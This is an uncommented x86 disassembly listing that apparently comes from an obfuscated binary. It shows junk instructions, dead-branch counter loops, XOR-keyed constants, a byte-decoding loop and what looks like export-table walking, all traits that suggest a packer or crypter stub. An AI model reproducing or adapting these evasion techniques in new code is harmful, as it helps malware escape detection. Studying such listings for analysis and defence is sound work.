  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c16
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x42382d
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423844
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c36
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421b8c
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x4239a2
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d26,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423af1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d2a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d26,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c16
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x4239c2
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c16
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
